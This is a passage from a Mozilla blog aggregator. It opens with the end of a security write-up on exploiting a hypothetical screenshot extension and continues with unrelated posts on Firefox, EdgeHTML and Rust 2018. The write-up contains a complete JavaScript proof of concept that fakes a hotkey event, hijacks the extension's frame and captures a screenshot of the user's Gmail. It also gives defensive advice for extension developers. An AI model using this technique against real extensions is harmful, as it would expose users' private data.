<p>And here lies the issue of course. While the webpage cannot predict what the frame name will be, it can see the frame being injected and change the <code>src</code> attribute into something else. It can load a page from the same server, then it will be able to access the injected extension UI. A submission I received for this challenge solved this even more elegantly: by assigning <code>window.name = frame.name</code> it made sure that the extension UI was injected directly into their webpage!</p>

<p>Now the only issue is bringing up the extension UI. With Firefox Screenshots I had to rely on the user clicking ‚ÄúTake a screenshot.‚Äù The extension in the challenge allowed triggering its functionality via a hotkey however. And, like so often, it failed checking for <a href="https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted">event.isTrusted</a>, so it would accept events generated by the webpage. Since the extension handles events synchronously, the following code is sufficient here:</p>

<pre><code>window.dispatchEvent(new KeyboardEvent("keydown", {
  key: "S",
  ctrlKey: true,
  shiftKey: true
}));
let frame = document.getElementsByTagName("iframe")[0];
frame.src = "blank.html";</code></pre>

<p><em>Recommendation for developers</em>: Any content which you inject into websites should always be contained inside a frame that is part of your extension. This at least makes sure that the website cannot access the frame contents, but you still have to worry about clickjacking and spoofing attacks.</p>

<p>Also, if you ever attach event listeners to website content, always make sure that <code>event.isTrusted</code> is <code>true</code>, so it‚Äôs a real event rather than the website playing tricks on you.</p>

<h4>What to screenshot?</h4>

<p>Once the webpage can access the extension UI, clicking the ‚ÄúScreenshot to clipboard‚Äù button programmatically is trivial. Again <code>Event.isTrusted</code> is not being checked here. However, even though Firefox Screenshots only accepted trusted events, it didn‚Äôt help it much. At this point the webpage can make the button transparent and huge, so when the user clicks somewhere the button is always triggered.</p>

<p>The webpage can create a screenshot, but what‚Äôs the deal? With Firefox Screenshots I only realized it after creating the bug report, the big issue here is that the webpage can screenshot third-party pages. Just load some page in a frame and it will be part of the screenshot even though you normally cannot access its contents. Only trouble: really critical sites such as Gmail don‚Äôt allow being loaded in a frame these days.</p>

<p>Luckily, this challenge had to be compatible with Chrome. And while Firefox extensions can use <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/captureTab">tabs.captureTab method</a> to capture a specific tab, there is nothing comparable for Chrome. The solution that the hypothetical extension author took was using <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/captureVisibleTab">tabs.captureVisibleTab method</a> which works in any browser. Side-effect: the visible tab isn‚Äôt necessarily the tab where the screenshotting UI lives.</p>

<p>So the attacks starts by asking the user to click a button. When clicked, that button opens Gmail in a new tab. The original page stays in background and initiates screenshotting. When the screenshot is done it will contain Gmail, not the attacking website.</p>

<h4>How to get the screenshot?</h4>

<p>The last step is getting the screenshot which is being copied to clipboard. Here, a Firefox bug makes things a lot easier for attackers. Until very recently, the only way to copy something to clipboard was <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Interact_with_the_clipboard#Using_execCommand()">calling document.execCommand() on a text field</a>. And Firefox doesn‚Äôt allow this action to be performed on the extension‚Äôs background page, so extensions will often resort to doing it in the context of web pages that they don‚Äôt control.</p>

<p>The most straight-forward solution is registering a <code>copy</code> event listener on the page, it will be triggered when the extension attempts to copy to the clipboard. That‚Äôs how I did it with Firefox Screenshots, and one of the submitted answers also uses this approach. But I actually forgot about it when I created my own solution for this challenge, so I used mutation observers to see when a text field is inserted into the page and read out its value (the actual screenshot <span class="caps">URL</span>):</p>

<pre><code>let observer = new MutationObserver(mutationList =&gt;
{
  for (let mutation of mutationList)
  {
    if (mutation.addedNodes &amp;&amp; mutation.addedNodes[0].localName == "textarea")
      document.body.innerHTML = `&lt;p&gt;Here is what Gmail looks like for you:&lt;/p&gt;&lt;img src="${mutation.addedNodes[0].value}"&gt;`;
  }
});
observer.observe(document.body, {childList: true});</code></pre>

<p>I hope that the new <a href="https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API">Clipboard <span class="caps">API</span></a> finally makes things sane here, so it isn‚Äôt merely more elegant but also gets rid of this huge footgun. But I didn‚Äôt have any chance to play with it yet, this <span class="caps">API</span> only being available since Chrome 66 and Firefox 63. So the recommendation is still: make sure to run any clipboard operations in a context that you control. If the background page doesn‚Äôt work, use a tab or frame belonging to your extension.</p>

<h4>The complete solution</h4>

<p>That‚Äôs pretty much it, everything else is only about visuals and timing. The attacking website needs to hide the extension UI so that the user doesn‚Äôt suspect anything. It also has no way of knowing when Gmail finishes loading, so it has to wait some arbitrary time. Here is what I got altogether. It is one way to solve this challenge but certainly not the only one.</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;Screenshotter.PRO browser extension (solution)&lt;/title&gt;
    &lt;script&gt;
      function runAttack()
      {
        let targetWnd = window.open("https://gmail.com/", "_blank");

        window.dispatchEvent(new KeyboardEvent("keydown", {
          key: "S",
          ctrlKey: true,
          shiftKey: true
        }));

        let frame = document.getElementsByTagName("iframe")[0];
        frame.src = "blank.html";
        frame.style.visibility = "hidden";
        frame.addEventListener("load", () =&gt;
        {
          // Leave some time for gmail.com to load
          window.setTimeout(function()
          {
            frame.contentDocument.getElementById("do_screenshot").click();

            let observer = new MutationObserver(mutationList =&gt;
            {
              for (let mutation of mutationList)
              {
                if (mutation.addedNodes &amp;&amp; mutation.addedNodes[0].localName == "textarea")
                {
                  targetWnd.close();
                  document.body.innerHTML = `&lt;p&gt;Here is what Gmail looks like for you:&lt;/p&gt;&lt;img src="${mutation.addedNodes[0].value}"&gt;`;
                }
              }
            });
            observer.observe(document.body, {childList: true});
          }, 2000);
        });
      }
    &lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;button onclick="runAttack();"&gt;Click here for a surprise!&lt;/button&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></div></div><div class="permalink"><a href="https://palant.de/2018/12/10/bbn-challenge-resolution-exploiting-the-screenshotterpro-browser-extension">by Wladimir Palant at <time datetime="2018-12-10T13:03:23Z" title="December 10, 2018 01:03 PM GMT">‰∏ãÂçà9:03:23</time></a></div></div><div class="news ryan-harter"><a id="news-40"></a><h3><a href="https://blog.harterrt.com/" title="blog.harterrt.com">Ryan Harter</a> ‚Äî <a href="https://blog.harterrt.com/2018_slow_to_respond.html">Slow to respond through 2018</a></h3><div class="entry"><div class="content"><p>I'm working on an urgent and high priority request for the next few weeks.
To make sure I can finish this work in 2018
I'm <strong>limiting my meetings and communications</strong> for the remainder of the year.</p>
<p>Slack is good for getting my immediate attention,
but if your request takes more than a one word response
it's likely to get lost in the shuffle.
If you need me to take some action 
<a href="https://bugzilla.mozilla.org/enter_bug.cgi?assigned_to=rharter%40mozilla.com&amp;bug_file_loc=http%3A%2F%2F&amp;bug_ignored=0&amp;bug_severity=normal&amp;bug_status=NEW&amp;cf_fx_iteration=---&amp;cf_fx_points=---&amp;component=General&amp;contenttypemethod=list&amp;contenttypeselection=text%2Fplain&amp;flag_type-4=X&amp;flag_type-607=X&amp;flag_type-800=X&amp;flag_type-803=X&amp;form_name=enter_bug&amp;maketemplate=Remember%20values%20as%20bookmarkable%20template&amp;op_sys=Mac%20OS%20X&amp;priority=--&amp;product=Data%20Science&amp;rep_platform=x86_64&amp;target_milestone=---&amp;version=unspecified">filing a bug</a>
is your best bet.
If you don't want to file a bug, email is fine.
Keep in mind that my response time will be very slow during this time.</p>
<p>If you need immediate help, try the following:</p>
<ul>
<li>If your question is about a search analysis or new search telemetry,
   please contact bmiroglio AT mozilla.com</li>
<li>If your question is about search data, see the documentation here.
   If that doesn't help, contact wlach AT mozilla.com</li>
<li>For general data science questions contact rweiss AT mozilla.com</li>
<li>For general telemetry questions,
   ask #fx-metrics on Slack or #datapipeline on IRC</li>
</ul>
<p>Otherwise, I'll get back to you as soon as I can!
Thanks for your understanding.</p></div></div><div class="permalink"><a href="https://blog.harterrt.com/2018_slow_to_respond.html">by Ryan T. Harter at <time datetime="2018-12-10T08:00:00Z" title="December 10, 2018 08:00 AM GMT">‰∏ãÂçà4:00:00</time></a></div></div><div class="news cameron-kaiser"><a id="news-41"></a><h3><a href="http://tenfourfox.blogspot.com/" title="TenFourFox Development">Cameron Kaiser</a> ‚Äî <a href="http://tenfourfox.blogspot.com/2018/12/tenfourfox-fpr11-available.html">TenFourFox FPR11 available</a></h3><div class="entry"><div class="content">TenFourFox Feature Parity Release 11 final is now available for testing (<a href="https://sourceforge.net/projects/tenfourfox/files/fpr11/">downloads</a>, <a href="https://github.com/classilla/tenfourfox/wiki/Hashes">hashes</a>, <a href="https://github.com/classilla/tenfourfox/wiki/ZZFPRReleaseNotes11">release notes</a>). <a href="https://github.com/classilla/tenfourfox/issues/525">Issue 525</a> has stuck, so that's being shipped and we'll watch for site or add-on compatibility fallout (though if you're reporting a site or add-on that doesn't work with FPR11, or for that matter any release, <em>please</em> verify that it still worked with prior versions: particularly for websites, it's more likely the site changed than we did). There are no other changes other than bringing security fixes up to date. Assuming no problems, it will go live tomorrow evening as usual. <p>FPR12 will be a smaller-scope release but there will still be some minor performance improvements and bugfixes, and with any luck we will also be shipping Rapha√´l's enhanced AltiVec string matcher in this release as well. Because of the holidays, family visits, etc., however, don't expect a beta until around the second week of January.</p></div></div><div class="permalink"><a href="http://tenfourfox.blogspot.com/2018/12/tenfourfox-fpr11-available.html">by ClassicHasClass at <time datetime="2018-12-10T01:21:56Z" title="December 10, 2018 01:21 AM GMT">‰∏äÂçà9:21:56</time></a></div></div><h2><time datetime="2018-12-06">Friday, 7 December 2018</time></h2><div class="news the-mozilla-blog" xml:lang="en-US"><a id="news-42"></a><h3><a href="https://blog.mozilla.org/" title="The Mozilla Blog">The Mozilla Blog</a> ‚Äî <a href="https://blog.mozilla.org/blog/2018/12/06/goodbye-edge/">Goodbye, EdgeHTML</a></h3><div class="entry"><div class="content"><p>Microsoft is officially giving up on an independent shared platform for the internet. By adopting Chromium, Microsoft hands over control of even more of online life to Google.</p>
<p>This may sound melodramatic, but it‚Äôs not. The ‚Äúbrowser engines‚Äù ‚Äî Chromium from Google and Gecko Quantum from Mozilla ‚Äî are ‚Äúinside baseball‚Äù pieces of software that actually determine a great deal of what each of us can do online. They determine core capabilities such as which content we as consumers can see, how secure we are when we watch content, and how much control we have over what websites and services can do to us. Microsoft‚Äôs decision gives Google more ability to single-handedly decide what possibilities are available to each one of us.</p>
<p>From a business point of view Microsoft‚Äôs decision may well make sense. Google is so close to almost complete control of the infrastructure of our online lives that it may not be profitable to continue to fight this. The interests of Microsoft‚Äôs shareholders may well be served by giving up on the freedom and choice that the internet once offered us. Google is a fierce competitor with highly talented employees and a monopolistic hold on unique assets. Google‚Äôs dominance across search, advertising, smartphones, and data capture creates a vastly tilted playing field that works against the rest of us.</p>
<p>From a social, civic and individual empowerment perspective ceding control of fundamental online infrastructure to a single company is terrible. This is <a href="https://www.mozilla.org/en-US/about/manifesto/">why Mozilla exists</a>. We compete with Google not because it‚Äôs a good business opportunity. We compete with Google because the health of the internet and online life depend on competition and choice. They depend on consumers being able to decide we want something better and to take action.</p>
<p>Will Microsoft‚Äôs decision make it harder for Firefox to prosper? It could. Making Google more powerful is risky on many fronts. And a big part of the answer depends on what the web developers and businesses who create services and websites do. If one product like Chromium has enough market share, then it becomes easier for web developers and businesses to decide not to worry if their services and sites work with anything other than Chromium. That‚Äôs what happened when Microsoft had a monopoly on browsers in the early 2000s before Firefox was released. And it could happen again.</p>
<p>If you care about what‚Äôs happening with online life today, take another look at Firefox. It‚Äôs radically better than it was 18 months ago ‚Äî Firefox once again holds its own when it comes to speed and performance. <a href="https://www.mozilla.org/en-US/firefox/fights-for-you/">Try Firefox</a> as your default browser for a week and then decide. Making Firefox stronger won‚Äôt solve all the problems of online life ‚Äî browsers are only one part of the equation. But if you find Firefox is a good product for you, then your use makes Firefox stronger. Your use helps web developers and businesses think beyond Chrome. And this helps Firefox and Mozilla make overall life on the internet better ‚Äî more choice, more security options, more competition.</p>
<p>The post <a href="https://blog.mozilla.org/blog/2018/12/06/goodbye-edge/" rel="nofollow">Goodbye, EdgeHTML</a> appeared first on <a href="https://blog.mozilla.org/" rel="nofollow">The Mozilla Blog</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/blog/2018/12/06/goodbye-edge/">by Chris Beard at <time datetime="2018-12-06T21:21:05Z" title="December 06, 2018 09:21 PM GMT">‰∏äÂçà5:21:05</time></a></div></div><div class="news mozilla-future-releases-blog" xml:lang="en-US"><a id="news-43"></a><h3><a href="https://blog.mozilla.org/futurereleases" title="Future Releases">Mozilla Future Releases Blog</a> ‚Äî <a href="https://blog.mozilla.org/futurereleases/2018/12/06/firefox-coming-to-the-windows-10-on-qualcomm-snapdragon-devices-ecosystem/">Firefox Coming to the Windows 10 on Qualcomm Snapdragon Devices Ecosystem</a></h3><div class="entry"><div class="content"><p>At Mozilla, we‚Äôve been building browsers for 20 years and we‚Äôve learned a thing or two over those decades. One of the most important lessons is putting people at the center of the web experience. We pioneered user-centric features like tabbed browsing, automatic pop-up blocking, integrated web search, and browser extensions for the ultimate in personalization. All of these innovations support real users‚Äô needs first, putting business demands in the back seat.</p>
<p>Mozilla is uniquely positioned to build browsers that act as the user‚Äôs agent on the web and not simply as the top of an advertising funnel. Our <a href="https://www.mozilla.org/en-US/mission/">mission</a> not only allows us to put privacy and security at the forefront of our product strategy, it demands that we do so. You can see examples of this with Firefox‚Äôs <a href="https://blog.mozilla.org/firefox/facebook-container-extension/">Facebook Container</a> extension, <a href="https://blog.mozilla.org/blog/2018/09/25/introducing-firefox-monitor-helping-people-take-control-after-a-data-breach/">Firefox Monitor</a>, and its <a href="https://hacks.mozilla.org/2018/11/firefox-sync-privacy/">private by design browser data syncing features</a>. This will become even more apparent in upcoming releases of Firefox that will <a href="https://blog.mozilla.org/futurereleases/2018/08/30/changing-our-approach-to-anti-tracking/">block certain cross-site and third-party tracking by default</a> while delivering a fast, personal, and highly mobile experience.</p>
<p>When we set out several years ago to build <a href="https://blog.mozilla.org/blog/2017/11/14/introducing-firefox-quantum/">a new version of Firefox called Quantum</a>, one that utilized multiple computer processes the way an operating system does, we didn‚Äôt simply break the browser into as many processes as possible. We <a href="https://data.firefox.com/dashboard/hardware">investigated what kinds of hardware people had</a> and built a solution that took best advantage of processors with multiple cores, which also makes <a href="https://www.qualcomm.com/news/onq/2018/12/06/snapdragon-8cx-most-extreme-snapdragon-ever">Firefox a great browser for Snapdragon</a>. We also offloaded significant page loading tasks to the increasingly powerful GPUs shipping with modern PCs and we <a href="https://blog.mozilla.org/blog/2017/09/26/firefox-quantum-beta-developer-edition/firefox-quantum-photon-ui-3/">re-designed the browser front-end</a> to bring more efficiency to everyday tasks.</p>
<p>Today, Mozilla is excited to be collaborating with Qualcomm and optimizing Firefox for the Snapdragon compute platform with a native ARM64 version of Firefox that takes full advantage of the capabilities of the Snapdragon compute platform and gives users the most performant out of the box experience possible. We can‚Äôt wait to see Firefox delivering blazing fast experiences for the always on, always connected, multi-core Snapdragon compute platform with Windows 10.</p>
<p>Stay tuned. It‚Äôs going to be great!</p>
<p>The post <a href="https://blog.mozilla.org/futurereleases/2018/12/06/firefox-coming-to-the-windows-10-on-qualcomm-snapdragon-devices-ecosystem/" rel="nofollow">Firefox Coming to the Windows 10 on Qualcomm Snapdragon Devices Ecosystem</a> appeared first on <a href="https://blog.mozilla.org/futurereleases" rel="nofollow">Future Releases</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/futurereleases/2018/12/06/firefox-coming-to-the-windows-10-on-qualcomm-snapdragon-devices-ecosystem/">by Marissa Morris at <time datetime="2018-12-06T21:05:28Z" title="December 06, 2018 09:05 PM GMT">‰∏äÂçà5:05:28</time></a></div></div><div class="news hacks-mozilla-org" xml:lang="en-US"><a id="news-44"></a><h3><a href="https://hacks.mozilla.org/" title="Mozilla Hacks ‚Äì the Web developer blog">Hacks.Mozilla.Org</a> ‚Äî <a href="https://hacks.mozilla.org/2018/12/rust-2018-is-here/">Rust 2018 is here‚Ä¶ but what is it?</a></h3><div class="entry"><div class="content"><p><strong>This post was written in collaboration with the Rust Team (the ‚Äúwe‚Äù in this article). You can also read <a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html">their announcement</a> on the Rust blog.</strong></p>
<p>Starting today, the Rust 2018 edition is in its first release. With this edition, we‚Äôve focused on productivity‚Ä¶ on making Rust developers as productive as they can be.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/01_01-rust2018.png"><img alt="A timeline showing the different channels: beta, Rust 2018, and Rust 2015, with features flowing from beta to the other two. The timeline is surrounded by icons for tooling and for 4 domains: WebAssembly, embedded, networking, and CLI. A red circle surrounds everything except for Rust 2015 and is labeled with Developer Productivity." class="alignnone size-large wp-image-32986" src="01_01-rust2018-500x549.png" width="500" height="549" /></a></p>
<p>But beyond that, it can be hard to explain exactly what Rust 2018 is.</p>
<p>Some people think of it as a new version of the language, which it is‚Ä¶ kind of, but not really. I say ‚Äúnot really‚Äù because if this is a new version, it doesn‚Äôt work like versioning does in other languages.</p>
<p>In most other languages, when a new version of the language comes out, any new features are added to that new version. The previous version doesn‚Äôt get new features.</p>
<p>Rust editions are different. This is because of the way the language is evolving. Almost all of the new features are 100% compatible with Rust as it is. They don‚Äôt require any breaking changes. That means there‚Äôs no reason to limit them to Rust 2018 code. New versions of the compiler will continue to support ‚ÄúRust 2015 mode‚Äù, which is what you get by default.</p>
<p>But sometimes to advance the language, you need to add things like new syntax. And this new syntax can break things in existing code bases.</p>
<p>An example of this is the <code>async/await</code> feature. Rust initially didn‚Äôt have the concepts of <code>async</code> and <code>await</code>. But it turns out that these primitives are really helpful. They make it easier to write code that is asynchronous without the code getting unwieldy.</p>
<p>To make it possible to add this feature, we need to add both <code>async</code> and <code>await</code> as keywords. But we also have to be careful that we‚Äôre not making old code invalid‚Ä¶ code that might‚Äôve used the words <code>async</code> or <code>await</code> as variable names.</p>
<p>So we‚Äôre adding the keywords as part of Rust 2018. Even though the feature hasn‚Äôt landed yet, the keywords are now reserved. All of the breaking changes needed for the next three years of development (like adding new keywords) are being made in one go, in Rust 1.31.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/01_02-breaking-changes-02.png"><img alt="Timeline with a line connecting Rust 2015 to the start of Rust 2018 at release 1.31." class="alignnone size-large wp-image-32997" src="01_02-breaking-changes-02-500x353.png" width="500" height="353" /></a></p>
<p>Even though there are breaking changes in Rust 2018, that doesn‚Äôt mean your code will break. Your code will continue compiling even if it has <code>async</code> or <code>await</code> as a variable name. Unless you tell it otherwise, the compiler assumes you want it to compile your code the same way that it has been up to this point.</p>
<p>But as soon as you want to use one of these new, breaking features, you can opt in to Rust 2018 mode. You just run <code>cargo fix</code>, which will tell you if you need to update your code to use the new features. It will also mostly automate the process of making the changes. Then you can add <code>edition=2018</code> to your Cargo.toml to opt in and use the new features.</p>
<p>This edition specifier in Cargo.toml doesn‚Äôt apply to your whole project‚Ä¶ it doesn‚Äôt apply to your dependencies. It‚Äôs scoped to just the one crate. This means you‚Äôll be able to have crate graphs that have Rust 2015 and Rust 2018 interspersed.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/01_03-crate-graph.png"><img alt="" class="alignnone size-large wp-image-32988" src="01_03-crate-graph-500x330.png" width="500" height="330" /></a></p>
<p>Because of this, even once Rust 2018 is out there, it‚Äôs mostly going to look the same as Rust 2015. Most changes will land in both Rust 2018 and Rust 2015. Only the handful of features that require breaking changes won‚Äôt pass through.¬†<a href="https://hacks.mozilla.org/files/2018/12/01_04-rust2018-only.png"><img alt="" class="alignnone size-large wp-image-32998" src="01_04-rust2018-only-500x290.png" width="500" height="290" /></a></p>
<p>Rust 2018 isn‚Äôt just about changes to the core language, though. In fact, far from it.</p>
<p>Rust 2018 is a push to make Rust developers more productive. Many productivity wins come from things outside of the core language‚Ä¶ things like tooling. They also come from focusing on specific use cases and figuring out how Rust can be the most productive language for those use cases.</p>
<p>So you could think of Rust 2018 as the specifier in Cargo.toml that you use to enable the handful of features that require breaking changes‚Ä¶</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/01_05-handful-of-changes.png"><img alt="Timeline with arrows pointing to the couple of Rust 2018 features that aren't passing through to Rust 2015." class="alignnone size-large wp-image-32999" src="01_05-handful-of-changes-500x381.png" width="500" height="381" /></a></p>
<p>Or you can think about it as a moment in time, where Rust becomes one of the most productive languages you can use in many cases‚Ää‚Äî‚Ääwhenever you need performance, light footprint, or high reliability.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/01_06-as_this.png"><img alt="" class="alignnone size-large wp-image-33000" src="01_06-as_this-500x463.png" width="500" height="463" /></a></p>
<p>In our minds, it‚Äôs the second. So let‚Äôs look at all that happened outside of the core language. Then we can dive into the core language itself.</p>
<h3>Rust for specific use¬†cases</h3>
<p>A programming language can‚Äôt be productive by itself, in the abstract. It‚Äôs productive when put to some use. Because of this, the team knew we didn‚Äôt just need to make Rust as a language or Rust tooling better. We also needed to make it easier to use Rust in particular domains.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/02_01-specific-use-cases.png"><img alt="" class="alignnone size-large wp-image-33001" src="02_01-specific-use-cases-500x376.png" width="500" height="376" /></a></p>
<p>In some cases, this meant creating a whole new set of tools for a whole new ecosystem.</p>
<p>In other cases, it meant polishing what was already in the ecosystem and documenting it well so that it‚Äôs easy to get up and running.</p>
<p>The Rust team formed working groups focused on four domains:</p>
<ul>
<li>WebAssembly</li>
<li>Embedded applications</li>
<li>Networking</li>
<li>Command line tools</li>
</ul>
<h4>WebAssembly</h4>
<p>For WebAssembly, the working group needed to create a whole new suite of tools.</p>
<p>Just last year, WebAssembly <a href="https://hacks.mozilla.org/2017/02/creating-and-working-with-webassembly-modules/">made it possible to compile languages like Rust</a> to run on the web. Since then, Rust has quickly become the <a href="https://hacks.mozilla.org/2018/03/making-webassembly-better-for-rust-for-all-languages/">best language for integrating</a> with existing web applications.</p>
<p><a href="https://hacks.mozilla.org/files/2018/03/01_rust_loves_js.png"><img alt="Rust logo and JS logo with a heart in between" class="alignnone size-large wp-image-32009" src="01_rust_loves_js-500x201.png" width="500" height="201" /></a></p>
<p>Rust is a good fit for web development for two reasons:</p>
<ol>
<li>¬†Cargo‚Äôs crates ecosystem works in the same way that most web app developers are used to. You pull together a bunch of small modules to form a larger application. This means that it‚Äôs easy to use Rust just where you need it.</li>
<li>Rust has a light footprint and doesn‚Äôt require a runtime. This means that you don‚Äôt need to ship down a bunch of code. If you have a tiny module doing lots of heavy computational work, you can introduce a few lines of Rust just to make that run faster.</li>
</ol>
<p>With the <a href="https://rustwasm.github.io/2018/09/26/announcing-web-sys.html"><code>web-sys</code> and <code>js-sys</code> crates</a>, it‚Äôs easy to call web APIs like <code>fetch</code> or <code>appendChild</code> from Rust code. And <code>wasm-bindgen</code> makes it easy support high-level data types that WebAssembly doesn‚Äôt natively support.</p>
<p>Once you‚Äôve coded up your Rust WebAssembly module, there are tools to make it easy to plug it into the rest of your web application. You can use <a href="https://github.com/rustwasm/wasm-pack">wasm-pack</a> to run these tools automatically, and push your new module up to npm if you want.</p>
<p>Check out the <a href="https://rustwasm.github.io/book/">Rust and WebAssembly book</a> to try it yourself.</p>
<h5>What‚Äôs next?</h5>
<p>Now that Rust 2018 has shipped, the working group is figuring out where to take things next. They‚Äôll be working with the community to determine the next areas of focus.</p>
<h4>Embedded</h4>
<p>For embedded development, the working group needed to make existing functionality stable.</p>
<p>In theory, Rust has always been a good language for embedded development. It gives embedded developers the modern day tooling that they are sorely lacking, and very convenient high-level language features. All this without sacrificing on resource usage. So Rust seemed like a great fit for embedded development.</p>
<p>However, in practice it was a bit of a wild ride. Necessary features weren‚Äôt in the <a href="https://blog.rust-lang.org/2014/10/30/Stability.html">stable channel</a>. Plus, the standard library needed to be tweaked for use on embedded devices. That meant that people had to compile their own version of the Rust core crate (the crate which is used in every Rust app to provide Rust‚Äôs basic building blocks‚Ää‚Äî‚Ääintrinsics and primitives).</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/02_02-bronco.png"><img alt="On the left: Someone riding a bucking microprocesser chip, saying &quot;Whoa, Rusty!&quot;. On the right, someone riding a tame microprocessor chip saing &quot;Good Rusty, nice and steady&quot;" class="alignnone size-large wp-image-32990" src="02_02-bronco-500x444.png" width="500" height="444" /></a></p>
<p>Together, these two things meant developers had to depend on the nightly version of Rust. And since there were no automated tests for micro-controller targets, nightly would often break for these targets.</p>
<p>To fix this, the working group needed to make sure that necessary features were in the stable channel. We also had to add tests to the CI system for micro-controller targets. This means a person adding something for a desktop component won‚Äôt break something for an embedded component.</p>
<p>With these changes, embedded development with Rust moves away from the bleeding edge and towards the plateau of productivity.</p>
<p>Check out the <a href="https://rust-embedded.github.io/book/">Embedded Rust book</a> to try it yourself.</p>
<h5>What‚Äôs next?</h5>
<p>With this year‚Äôs push, Rust has really good support for ARM Cortex-M family of microprocessor cores, which are used in a lot of devices. However, there are lots of architectures used on embedded devices, and those aren‚Äôt as well supported. Rust needs to expand to have the same level of support for these other architectures.</p>
<h4>Networking</h4>
<p>For networking, the working group needed to build a core abstraction into the language‚Äî<code>async/await</code>. This way, developers can use idiomatic Rust even when the code is asynchronous.</p>
<p>For networking tasks, you often have to wait. For example, you may be waiting for a response to a request. If your code is synchronous, that means the work will stop‚Äîthe CPU core that is running the code can‚Äôt do anything else until the request comes in. But if you code asynchronously, then the function that‚Äôs waiting for the response can go on hold while the CPU core takes care of running other functions.</p>
<p>Coding asynchronous Rust is possible even with Rust 2015. And there are lots of upsides to this. On the large scale, for things like server applications, it means that your code can handle many more connections per server. On the small scale, for things like embedded applications that are running on tiny, single threaded CPUs, it means you can make better use of your single thread.</p>
<p>But these upsides came with a major downside‚Äîyou couldn‚Äôt use the borrow checker for that code, and you would have to write unidiomatic (and somewhat confusing) Rust. This is where <code>async/await</code> comes in. It gives the compiler the information it needs to borrow check across asynchronous function calls.</p>
<p>The keywords for <code>async/await</code> were introduced in 1.31, although they aren‚Äôt currently backed by an implementation. Much of that work is done, and you can expect the feature to be available in an upcoming release.</p>
<h5>What‚Äôs next?</h5>
<p>Beyond just enabling productive low-level development for networking applications, Rust could enable more productive development at a higher level.</p>
<p>Many servers need to do the same kinds of tasks. They need to parse URLs or work with HTTP. If these were turned into components‚Äîcommon abstractions that could be shared as crates‚Äîthen it would be easy to plug them together to form all sorts of different servers and frameworks.</p>
<p>To drive the component development process, the <a href="https://github.com/rust-net-web/tide">Tide framework</a> is providing a test bed for, and eventually example usage of, these components.</p>
<h4>Command line¬†tools</h4>
<p>For command line tools, the working group needed to bring together smaller, low-level libraries into higher level abstractions, and polish some existing tools.</p>
<p>For some CLI scripts, you really want to use bash. For example, if you just need to call out to other shell tools and pipe data between them, then bash is best.</p>
<p>But Rust is a great fit for a lot of other kinds of CLI tools. For example, it‚Äôs great if you are building a complex tool like <a href="https://github.com/BurntSushi/ripgrep/">ripgrep</a> or building a CLI tool on top of an existing library‚Äôs functionality.</p>
<p>Rust doesn‚Äôt require a runtime and allows you to compile to a single static binary, which makes it easy to distribute. And you get high-level abstractions that you don‚Äôt get with other languages like C and C++, so that already makes Rust CLI developers productive.</p>
<p>What did the working group need to make this better still? Even higher-level abstractions.</p>
<p>With these higher-level abstractions, it‚Äôs quick and easy to assemble a production ready CLI.</p>
<p>An example of one of these abstractions is the <a href="https://github.com/rust-clique/human-panic">human panic</a> library. Without this library, if your CLI code panics, it probably outputs the entire back trace. But that‚Äôs not very helpful for your end users. You could add custom error handling, but that requires effort.</p>
<p>If you use human panic, then the output will be automatically routed to an error dump file. What the user will see is a helpful message suggesting that they report the issue and upload the error dump file.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/02_04-human-panic.png"><img alt="A cli tool with friendly output from human-panic" class="alignnone size-large wp-image-32991" src="02_04-human-panic-500x323.png" width="500" height="323" /></a></p>
<p>The working group also made it easier to get started with CLI development. For example, the <a href="https://github.com/rust-clique/confy">confy</a> library will automate a lot of setup for a new CLI tool. It only asks you two things:</p>
<ul>
<li>What‚Äôs the name of your application?</li>
<li>What are configuration options you want to expose (which you define as a struct that can be serialized and deserialized)?</li>
</ul>
<p>From that, confy will figure out the rest for you.</p>
<h5>What‚Äôs next?</h5>
<p>The working group abstracted away a lot of different tasks that are common between CLIs. But there‚Äôs still more that could be abstracted away. The working group will be making more of these high level libraries, and fixing more paper cuts as they go.</p>
<h3>Rust tooling</h3>
<p><a href="https://hacks.mozilla.org/files/2018/12/03_01-tooling-1.png"><img alt="Tooling icon" class="alignnone size-large wp-image-33002" src="03_01-tooling-1-500x435.png" width="500" height="435" /></a></p>
<p>When you experience a language, you experience it through tools. This starts with the editor that you use. It continues through every stage of the development process, and through maintenance.</p>
<p>This means that a productive language depends on productive tooling.</p>
<p>Here are some tools (and improvements to Rust‚Äôs existing tooling) that were introduced as part of Rust 2018.</p>
<h4>IDE support</h4>
<p>Of course, productivity hinges on fluidly getting code from your mind to the screen quickly. IDE support is critical to this. To support IDEs, we need tools that can tell the IDE what Rust code actually means‚Ää‚Äî‚Ääfor example, to tell the IDE what strings make sense for code completion.</p>
<p>In the Rust 2018 push, the community focused on the features that IDEs needed. With Rust Language Server and IntelliJ Rust, many IDEs now have fluid Rust support.</p>
<h4><strong class="markup--strong markup--h4-strong">Faster compilation</strong></h4>
<p>With compilation, faster means more productive. So we‚Äôve made the compiler faster.</p>
<p>Before, when you would compile a Rust crate, the compiler would recompile every single file in the crate. But now, with <a href="https://rust-lang-nursery.github.io/edition-guide/rust-2018/the-compiler/incremental-compilation-for-faster-compiles.html">incremental compilation</a>, the compiler is smart and only recompiles the parts that have changed. This, along with <a href="https://blog.mozilla.org/nnethercote/2018/04/30/how-to-speed-up-the-rust-compiler-in-2018/">other optimizations</a>, has made the Rust compiler much faster.</p>
<h4>rustfmt</h4>
